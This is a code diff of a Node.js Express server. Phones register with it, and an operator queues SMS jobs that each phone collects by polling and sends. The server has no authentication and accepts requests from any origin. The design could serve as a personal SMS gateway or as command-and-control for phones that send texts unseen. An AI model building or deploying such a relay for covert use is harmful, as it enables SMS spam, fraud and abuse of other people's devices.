@@ -1,64 +1,67 @@
-import express from "express";
+const express = require("express");
+const cors = require("cors");
+const { v4: uuidv4 } = require("uuid");
 
 const app = express();
+app.use(cors());
 app.use(express.json());
 
-const PORT = 3000;
-
-// In-memory storage
-const devices = new Set();
-const smsQueue = {}; // deviceId -> sms data
+/**
+ * In-memory store (Render free → OK for testing)
+ */
+const devices = {};      // deviceId -> { deviceId, model, time }
+const commands = {};     // deviceId -> [ { id, number, message } ]
 
 // Register device
 app.post("/register", (req, res) => {
-  const { deviceId } = req.body;
+  const { deviceId, model } = req.body;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
 
-  if (!deviceId) {
-    return res.status(400).json({ error: "deviceId required" });
-  }
+  devices[deviceId] = {
+    deviceId,
+    model: model || "unknown",
+    time: new Date()
+  };
 
-  devices.add(deviceId);
-  console.log("Registered:", deviceId);
+  if (!commands[deviceId]) commands[deviceId] = [];
 
-  res.json({ status: "registered", deviceId });
+  res.json({ success: true });
 });
 
 // Fetch all device IDs
 app.get("/fetch", (req, res) => {
-  res.json({ devices: Array.from(devices) });
+  res.json(Object.values(devices));
 });
 
 // Send SMS command
 app.post("/sendsms", (req, res) => {
   const { deviceId, number, message } = req.body;
 
-  if (!deviceId || !number || !message) {
-    return res.status(400).json({ error: "deviceId, number, message required" });
+  if (!devices[deviceId]) {
+    return res.status(404).json({ error: "Device not found" });
   }
 
-  if (!devices.has(deviceId)) {
-    return res.status(404).json({ error: "Device not registered" });
-  }
+  const cmd = {
+    id: uuidv4(),
+    number,
+    message
+  };
 
-  smsQueue[deviceId] = { number, message };
-  console.log("SMS queued for:", deviceId);
-
-  res.json({ status: "queued" });
+  commands[deviceId].push(cmd);
+  res.json({ success: true });
 });
 
-// App polls this
-app.get("/poll/:deviceId", (req, res) => {
-  const deviceId = req.params.deviceId;
+// Device polls for commands
+app.get("/commands", (req, res) => {
+  const { deviceId } = req.query;
 
-  if (smsQueue[deviceId]) {
-    const data = smsQueue[deviceId];
-    delete smsQueue[deviceId];
-    return res.json({ send: true, ...data });
-  }
+  if (!commands[deviceId]) return res.json([]);
 
-  res.json({ send: false });
+  const pending = commands[deviceId];
+  commands[deviceId] = []; // clear after send
+
+  res.json(pending);
 });
 
-app.listen(PORT, () => {
-  console.log(`Server running on http://localhost:${PORT}`);
-});
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log("Server running on", PORT));
